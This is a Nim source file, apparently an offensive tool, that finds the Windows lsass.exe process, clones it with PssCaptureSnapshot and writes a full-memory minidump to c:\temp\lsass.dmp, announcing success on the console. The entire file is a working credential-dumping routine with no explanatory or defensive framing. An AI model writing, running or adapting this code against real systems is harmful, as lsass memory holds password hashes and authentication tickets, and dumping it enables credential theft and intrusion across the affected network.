import winim

proc MyMiniDumpWriteDumpCallback(
    CallbackParam: PVOID,
    CallbackInput: ptr MINIDUMP_CALLBACK_INPUT,
    CallbackOutput: ptr MINIDUMP_CALLBACK_OUTPUT
): BOOL {.stdcall.} =
  case CallbackInput[].CallbackType
  of 16: # IsProcessSnapshotCallback
    CallbackOutput[].Status = S_FALSE
  return true

proc main() =
  var
    lsassPID: DWORD = 0
    lsassHandle: HANDLE = nil
    outFile = CreateFileW("c:\\temp\\lsass.dmp", GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nil)
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    processEntry: PROCESSENTRY32
    processName: LPCWSTR = ""

  processEntry.dwSize = sizeof(PROCESSENTRY32)

  if Process32First(snapshot, addr processEntry):
    while wcsicmp(processName, L"lsass.exe") != 0:
      Process32Next(snapshot, addr processEntry)
      processName = processEntry.szExeFile
      lsassPID = processEntry.th32ProcessID

    echo "[+] Got lsass.exe PID: ", lsassPID

  lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID)

  var
    snapshotHandle: HANDLE = nil
    flags: DWORD = DWORD(PSS_CAPTURE_VA_CLONE) or DWORD(PSS_CAPTURE_HANDLES) or DWORD(PSS_CAPTURE_HANDLE_NAME_INFORMATION) or DWORD(PSS_CAPTURE_HANDLE_BASIC_INFORMATION) or DWORD(PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION) or DWORD(PSS_CAPTURE_HANDLE_TRACE) or DWORD(PSS_CAPTURE_THREADS) or DWORD(PSS_CAPTURE_THREAD_CONTEXT) or DWORD(PSS_CAPTURE_THREAD_CONTEXT_EXTENDED) or DWORD(PSS_CREATE_BREAKAWAY) or DWORD(PSS_CREATE_BREAKAWAY_OPTIONAL) or DWORD(PSS_CREATE_USE_VM_ALLOCATIONS) or DWORD(PSS_CREATE_RELEASE_SECTION)
    CallbackInfo: MINIDUMP_CALLBACK_INFORMATION

  zeroMem(addr CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION))
  CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback
  CallbackInfo.CallbackParam = nil

  PssCaptureSnapshot(lsassHandle, PSS_CAPTURE_FLAGS(flags), CONTEXT_ALL, cast[ptr HPSS](addr snapshotHandle))

  let isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, nil, nil, addr CallbackInfo)

  if isDumped:
    echo "[+] lsass dumped successfully!"

  PssFreeSnapshot(GetCurrentProcess(), cast[HPSS](snapshotHandle))

main()
